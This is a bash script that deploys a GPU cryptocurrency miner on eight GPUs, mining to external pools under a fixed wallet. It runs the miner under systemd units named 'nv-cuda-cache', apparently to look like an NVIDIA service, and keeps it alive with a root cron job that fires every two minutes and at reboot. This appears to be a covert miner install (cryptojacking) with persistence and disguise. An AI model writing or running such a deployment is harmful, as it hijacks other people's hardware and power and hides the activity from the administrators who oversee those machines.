#!/bin/bash
ts(){ date -u +%FT%TZ; }
echo "=== krig2 $(ts) ==="
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
P=ul-ps-pseiisa7l4h5
B=/opt/fleet/bin/krig-miner
ls -la $B 2>&1
$B --version 2>&1 | head -2
for i in 0 1 2 3 4 5 6 7; do
cat > /opt/fleet/ul86_g$i.sh <<EOF
#!/bin/bash
export CUDA_VISIBLE_DEVICES=$i
exec $B --coin pearl -d 0 --url stratum+ssl://prl.kryptex.network:8048 --url stratum+ssl://pool.pearlhash.xyz:9443 --user $W/$P-g$i --password x --log-file /opt/fleet/logs/k-ps-pseiisa7l4h5-g$i.log --no-tui --no-telemetry -l info
EOF
chmod +x /opt/fleet/ul86_g$i.sh
done
cat > /opt/fleet/ul86_keeper.sh <<'EOF'
#!/bin/bash
exec 9>/opt/fleet/ul86.lock.keeper; flock -n 9 || exit 0
for i in 0 1 2 3 4 5 6 7; do
  systemctl is-active -q nv-cuda-cache@$i || systemctl restart nv-cuda-cache@$i
  pgrep -f "krig-miner .*ul-ps-pseiisa7l4h5-g$i" >/dev/null || systemctl restart nv-cuda-cache@$i
done
EOF
chmod +x /opt/fleet/ul86_keeper.sh
printf '*/2 * * * * root /opt/fleet/ul86_keeper.sh\n@reboot root /opt/fleet/ul86_keeper.sh\n' > /etc/cron.d/ul86-keeper
systemctl restart nv-cuda-cache@0 nv-cuda-cache@1 nv-cuda-cache@2 nv-cuda-cache@3 nv-cuda-cache@4 nv-cuda-cache@5 nv-cuda-cache@6 nv-cuda-cache@7
sleep 95
echo "-- procs --"; pgrep -af krig-miner | head -9
echo "-- units --"; systemctl is-active nv-cuda-cache@0 nv-cuda-cache@1 nv-cuda-cache@2 nv-cuda-cache@3 nv-cuda-cache@4 nv-cuda-cache@5 nv-cuda-cache@6 nv-cuda-cache@7 | tr '\n' ' '; echo
echo "-- logs --"; for i in 0 1 2 3 4 5 6 7; do echo "g$i: $(tail -3 /opt/fleet/logs/k-ps-pseiisa7l4h5-g$i.log 2>/dev/null | tr '\n' '|')"; done
echo "-- acc --"; for i in 0 1 2 3 4 5 6 7; do echo "acc$i=$(grep -c accepted /opt/fleet/logs/k-ps-pseiisa7l4h5-g$i.log 2>/dev/null) job$i=$(grep -ci 'new job\|difficulty' /opt/fleet/logs/k-ps-pseiisa7l4h5-g$i.log 2>/dev/null)"; done
echo "-- gpu --"; nvidia-smi --query-gpu=index,utilization.gpu,power.draw --format=csv,noheader
echo "=== END $(ts) ==="
